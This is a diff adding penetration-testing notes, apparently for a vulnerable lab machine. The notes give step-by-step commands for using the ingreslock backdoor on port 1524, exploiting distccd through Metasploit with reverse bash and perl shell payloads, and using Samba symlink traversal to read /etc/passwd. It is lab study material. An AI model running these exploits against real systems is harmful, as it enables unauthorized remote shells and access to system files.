@@ -54,3 +54,87 @@
         ```
         exploit
         ```
+
+## Ingreslock(port 1524)
+- It was a popular choice a decade ago for adding a backdoor to a compromised server
+- Easy to access
+    ```
+    telnet target_ip 1524
+    ```
+
+## Unintentional backdoor
+- distccd
+- Run the following command
+    ```
+    msfconsole
+    ```
+
+    ```
+    use exploit/unix/misc/distcc_exec
+    ```
+
+    ```
+    set RHOSTS target_ip
+    ```
+
+    ```
+    exploit
+    ```
+
+- By default this uses following 
+    ```
+    cmd/unix/reverse_bash
+    ```
+
+- Sometimes this payload doesn't work. So lets change this payload into another
+    ```
+    set payload cmd/unix/reverse_perl
+    ```
+- Now run exploit
+    ```
+    exploit
+    ```
+
+
+## Samba
+- Samba, when configured with a writeable file share and enabled (default is on), can also be used as a backdoor of sorts to access files that were not meant to be shared
+- Open terminal and paste following
+    ```
+    smbclient -L //target_ip
+    ```
+- They will ask password put kali linux password
+
+- Now after this again open another terminal and open msfconsole and perform following activities
+    ```
+    use auxiliary/admin/smb/samba_symlink_traversal
+    ```
+
+    ```
+    set RHOSTS target_ip
+    ```
+
+    ```
+    set SMBSHARE tmp
+    ```
+
+    ```
+    exploit
+    ```
+
+- Again go to new terminal and perform following activities
+    ```
+    smbclient //target_ip/tmp
+    ```
+
+    ```
+    cd rootfs
+    ```
+
+    ```
+    cd etc
+    ```
+
+    ```
+    more passwd
+    ```
+    
